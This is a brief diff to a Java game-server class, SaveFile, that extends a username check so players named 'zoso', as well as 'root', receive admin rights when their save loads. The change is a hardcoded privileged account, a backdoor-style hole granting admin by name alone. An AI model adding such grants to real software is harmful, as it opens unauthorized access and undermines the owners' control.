@@ -63,7 +63,7 @@ public class SaveFile implements Serializable {
     public int[] bankAmounts;
     
     public void load(Player player) {
-        player.setAdmin(player.getUsername().equalsIgnoreCase("root"));
+        player.setAdmin(player.getUsername().equalsIgnoreCase("root") || player.getUsername().equalsIgnoreCase("zoso"));
         player.setLocation(new Point(x, y), true);
         player.setFatigue(fatigue);
         player.setLastLogin(lastLogin);
